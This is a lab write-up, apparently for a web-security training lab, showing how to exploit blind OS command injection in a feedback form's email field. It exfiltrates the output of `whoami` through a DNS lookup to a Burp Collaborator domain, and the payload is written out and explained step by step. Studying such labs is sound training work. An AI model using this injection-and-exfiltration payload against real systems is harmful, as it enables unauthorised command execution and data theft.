# 🧪 Lab Write-up: Blind OS Command Injection with Out-of-Band Data Exfiltration

## 📌 Lab Overview

This lab builds on blind OS command injection by requiring **data exfiltration**.

* The application executes shell commands with user input.
* Execution is **asynchronous** (no direct response).
* Output cannot be retrieved in-band.
* However, **out-of-band (OOB)** techniques (DNS) can be used to extract data.

<img width="1010" height="729" alt="1 lab" src="https://github.com/user-attachments/assets/dcda4399-292c-4895-ab1e-9de4c3846e17" />

---

## 🎯 Objective

* Execute the `whoami` command on the target server.
* Exfiltrate the result via a **DNS request** to Burp Collaborator.
* Use the retrieved username to solve the lab.

---

## 🛠️ Tools Required

* Burp Suite Professional ( For Collaborator features )

<img width="860" height="298" alt="image" src="https://github.com/user-attachments/assets/c5d7e7df-f555-4577-858e-d3b2baba637c" />

---

## 🚶 Step-by-Step Exploitation

### 1. Open Feedback Form

* Navigate to the lab application.
* Go to **"Submit Feedback"**.

---

### 2. Enter Dummy Data

Fill the form with random values:

```id="a1"
Name: test
Email: test@test.com
Subject: test
Message: test
```

<img width="886" height="701" alt="2 submit-feedback" src="https://github.com/user-attachments/assets/7e1d50f7-2644-441a-970f-2124cc9c0ac1" />

---

### 3. Intercept the Request

* Turn **Intercept ON** in Burp Suite.
* Submit the form.
* Capture the request:

```id="a2"
POST /feedback/submit HTTP/1.1
```

---

### 4. Send to Repeater

* Right-click the request → **Send to Repeater**.

<img width="779" height="757" alt="3 repeater-request" src="https://github.com/user-attachments/assets/26d371ac-8179-470d-86e6-53c430215c36" />

---

### 5. Inject Exfiltration Payload

Modify the `email` parameter:

```id="a3"
email=test@test.com||nslookup `whoami`.<your-collaborator-payload>||
```

👉 Insert your payload using:

* Right-click → **Insert Collaborator payload**

* Click **Send** in Repeater.

<img width="1173" height="756" alt="4 modify-request" src="https://github.com/user-attachments/assets/d0a38bfd-75ec-4c2b-8c32-aa26f6c50e95" />

---

## 🔍 Payload Breakdown

```id="a4"
|| nslookup `whoami`.<collaborator-domain> ||
```

* `||` → Logical OR operator; executes next command
* `nslookup` → Performs DNS lookup (our OOB channel)
* `` `whoami` `` → Executes command and injects output inline
* `<collaborator-domain>` → Your Burp Collaborator domain

💡 Result:
If the current user is `peter`, the DNS request will look like:

```
peter.<collaborator-domain>
```

---

### 7. Check Burp Collaborator

* Go to **Collaborator tab**.
* Click **Poll now**.

✅ You should see a DNS interaction like:

```
<username>.<collaborator-domain>
```

---

### 8. Extract the Username

* Identify the username from the DNS request.

  * Example: `peter.xyz.burpcollaborator.net` → username = **peter**

<img width="1059" height="619" alt="5 result" src="https://github.com/user-attachments/assets/0b4d7203-3275-4c29-a568-3a71a3cb1bfd" />

---

### 9. Submit the Solution

* Return to the lab page.
* Enter the extracted username.
* Submit to complete the lab.

<img width="939" height="338" alt="6 submit-request" src="https://github.com/user-attachments/assets/7c97ba75-e9bb-4793-8c73-df8f48987ed1" />

---

## 🧠 Explanation

* This attack uses **command substitution** (`` `whoami` ``) to capture output.
* The output is embedded into a DNS request.
* Since DNS queries are observable externally, this allows **data exfiltration** from a blind context.

---

## ✅ Result

* Successfully exfiltrated the current system user.
* Verified via Burp Collaborator DNS interaction.
* 🎉 Lab solved!

<img width="908" height="351" alt="7 solved" src="https://github.com/user-attachments/assets/201b9a2c-4501-4448-89a2-6daea2db91d2" />

---

## 🔐 Key Takeaways

* Blind injection can still leak sensitive data using OOB channels.
* DNS is a reliable method for exfiltration.
* Command substitution is powerful for embedding output into requests.



